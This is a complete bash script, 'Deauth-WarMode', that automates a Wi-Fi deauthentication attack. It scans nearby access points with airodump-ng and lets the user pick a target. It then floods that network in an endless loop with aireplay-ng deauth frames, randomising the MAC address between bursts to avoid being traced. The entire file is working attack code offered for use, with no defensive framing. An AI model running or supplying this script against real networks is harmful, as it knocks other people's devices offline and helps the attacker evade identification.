#!/bin/bash
#DEAUTHER -- WAR-MODE
# "Script" written by hiehoox7

#defining colors
RED='\033[0;31m'
GREEN='\033[1;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTCYAN='\033[1;36m'
YELLOW='\033[1;33m'
NC='\033[0m' #No Color

#Ascii art is a must :D
clear
echo -n -e "${LIGHTCYAN}"
cat << "EOF"
 ___________________________________________________________________________________________
|  _______________________________________________________________________________________  |
| |  ____                   _   _        __        ___    ____  __  __  ___  ____  _____  | | 
| | |  _ \  ___  __ _ _   _| |_| |__     \ \      / / \  |  _ \|  \/  |/ _ \|  _ \| ____| | |
| | | | | |/ _ \/ _` | | | | __| '_ \ ____\ \ /\ / / _ \ | |_) | |\/| | | | | | | |  _|   | |
| | | |_| |  __/ (_| | |_| | |_| | | |_____\ V  V / ___ \|  _ <| |  | | |_| | |_| | |___  | |
| | |____/ \___|\__,_|\__,_|\__|_| |_|      \_/\_/_/   \_\_| \_\_|  |_|\___/|____/|_____| | |
| |_______________________________________________________________________________________| |
|___________________________________________________________________________________________|
                                       
EOF
echo -n -e "${NC}"


#getting root permissions
echo "! this script needs superuser permissions !"
sudo echo -e "[${YELLOW}*${NC}] superuser granted!"

#unblocking softblocks
rfkill unblock wlan

#getting interface name for deauth
if [ -z $1 ]; then
   echo -n -e "[${YELLOW}?${NC}] Wireless Interface for deauth (i.e ${GREEN}wlan0${NC}):${GREEN} "
   read iface
   echo -e "${NC}"
else
   iface=$1
fi

#Prepearing interface
echo -e -n "[${YELLOW}*${NC}] Killing Interfering Processes"
#killing procceses that conflict with airmon-ng
airmon-ng check kill
service network-manager stop
echo -e -n "\n[${YELLOW}*${NC}] Putting ${GREEN}${iface}${NC} Into Monitor Mode"
#turning on monitor mode
airmon-ng start ${iface}
#defining the monitor interface for later use
iface_mon=`ifconfig | grep mon | awk '{print $1}'`
#spoofing mac address
ifconfig ${iface_mon} down
echo -e -n "[${YELLOW}*${NC}] Zzz..\n"
sleep 1 
macchanger ${iface_mon} -a
ifconfig ${iface_mon} up
echo -e -n "[${YELLOW}*${NC}] Zzz..\n"
sleep 1 # this is to let the interface fully activate
mkdir warmode-temp
cd warmode-temp
echo -e -n "[${YELLOW}*${NC}] Scanning APs ( wait 10 seconds or press CTRL+C to exit )..."
#scanning for access points using xterm
xterm -fn "-misc-fixed-medium-r-normal--8-*-*-*-*-*-iso8859-15" +sb -geometry 140x30+620+2 -fa 'Monospace' -fs 8 -e 'timeout 10 airodump-ng --uptime -M '${iface_mon}' --update 1 --write airodump'
clear
#removing unnecessary stuff
rm {*.netxml,*.kismet*,*.cap} -f
#formatting the output
cut --complement -f 2-3,5-13,15 -d, airodump-01.csv | tr , " " | awk '{print $3}' | sed '/^$/d' | grep -iv 'essid' | awk '{print NR")",$0}' > for-user.txt
cut --complement -f 2-3,5-13,15 -d, airodump-01.csv | tr , " " | sed '/^\s*$/d' | grep -Eiv 'essid|mac' | awk '{print NR")",$0}' > for-script.txt
echo -e -n "\n${CYAN}--- AP LIST ---\n"
cat for-user.txt
echo -e -n "${NC}"
#a prompt to enter the bssid of the AP
echo -n -e "[${YELLOW}?${NC}] Choose AP :"
read ap_id
ap_id=${ap_id}
bssid=`cat for-script.txt | awk '{print $2}' | sed '/^\s*$/d' | awk 'NR=='${ap_id}''`
channel=`cat for-script.txt | awk '{print $3}' | sed '/^\s*$/d' | awk 'NR=='${ap_id}''`
echo "BSSID : "${bssid}
echo "CHANNEL:"${channel}
#spoofing mac and setting the channel
echo -n -e "[${YELLOW}?${NC}] changing iface frequency ( restartng monitor mode )"
airmon-ng stop ${iface}
airmon-ng stop ${iface_mon}
sleep 0.5
airmon-ng start ${iface} ${channel}
ifconfig ${iface_mon} down
echo -n -e "[${YELLOW}?${NC}] spoofing mac"
macchanger ${iface_mon} -a
ifconfig ${iface_mon} up

#CTRL+C trap -- when you press CTRL+C the ctrl_c() function will be executed 
#if ctrl_c() function is left empty after trapping then you won't be able to exit :P
trap ctrl_c INT
ctrl_c () {
echo ""
echo -e -n "[${YELLOW}*${NC}] Cleaning Up..."
airmon-ng stop ${iface_mon}
#Restoring MAC
ifconfig ${iface} down
echo -e "[${YELLOW}*${NC}] Zzzz.."
sleep 1
ifconfig ${iface} up
sleep 1
rm warmode-temp -rf 
echo -e "[${YELLOW}*${NC}] Starting network-manager"
service network-manager start
exit
}

#THE MAIN LOOP
echo -e -n "[${YELLOW}*${NC}] Press ${YELLOW}CTRL+C${NC} to stop"
while :
do
	aireplay-ng -0 500 -a ${bssid} ${iface_mon}
	echo -e -n "[${YELLOW}*${NC}] sleeping for 60 seconds.."
	sleep 60
	#MAC Spoofing
	echo -e -n "[${YELLOW}*${NC}] spoofing mac.."
	ifconfig ${iface_mon} down
	sleep 1
	macchanger ${iface_mon} -a
	ifconfig ${iface_mon} up
	sleep 1
done
